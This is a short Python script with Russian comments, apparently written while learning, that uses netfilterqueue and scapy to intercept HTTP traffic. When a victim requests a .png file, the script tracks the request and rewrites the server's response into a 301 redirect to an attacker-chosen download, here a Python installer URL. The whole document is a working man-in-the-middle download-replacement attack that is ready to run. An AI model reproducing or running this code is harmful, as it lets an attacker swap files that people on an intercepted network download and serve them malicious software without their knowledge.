
import netfilterqueue
import scapy.all as scapy

# создадим список который получает запрос с ответом ack и seq - они передают файл
ack_list = []#так она будет создаваться каждый раз при запросе

# фун удаления не нужных данных 
def set_load(packet, load):
    packet[scapy.Raw].load = load 
    # удаляем строки отвеч за разрмер пакета, длину 
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# фун перебора
def  proccess_packet(packet):
    # через скапи с помщью нэта мы можем получить теже строки но потом будем изменять
    scapy_pack = scapy.IP(packet.get_payload())
    # проверяем назанчение sport получаем htttp  dport отправлем
    if scapy_pack.haslayer(scapy.Raw):#проверяем на HTTP запросы
        # проверяем порты на выход
        if scapy.TCP in scapy_pack and scapy_pack[scapy.TCP].dport == 80:
            # print("HTTP запрос")
            # обозначим переменую для названия файлы
            file = b".png"
            # создадим фун которая будет искать нужное нам содержание в запросе load
            if file in scapy_pack[scapy.Raw].load:
                print("Получение ")
                # добавим наш элемент укз уровни перехода по запросу
                ack_list.append(scapy_pack[scapy.TCP].ack)
            # print(scapy_pack.show())
        elif scapy.TCP in scapy_pack and scapy_pack[scapy.TCP].sport == 80:
            print("HTTP ответ")
            # создадим замену
            if scapy_pack[scapy.TCP].seq in ack_list:#тем самым начинаем влиять на ответ
                # удаляем файл
                ack_list.remove(scapy_pack[scapy.TCP].seq)
                print("Замена файла")
                # перменная с кодом 301 для замены укз код 301 и в локации укз место файла также обозначем пременную которая будет вывзвать фун
                modified_pack = set_load(scapy_pack, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.python.org/ftp/python/3.11.3/python-3.11.3-macos11.pkg\n\n" )#укз файл
                # print(scapy_pack.show())
 
                
                # переводим в строку чтобы файлы стали читаемы для ответа
                packet.set_payload(bytes(modified_pack))#теперь все вернется клиенту правильно
            # print(scapy_pack.show())

    # для разрешения передачи
    packet.accept()
    
    # для запрета
    # packet.drop()

#переменная для пакетов 
queue = netfilterqueue.NetfilterQueue()
# перебор пакетов в 0 где обозначали хранение.
queue.bind(1, proccess_packet)
queue.run()
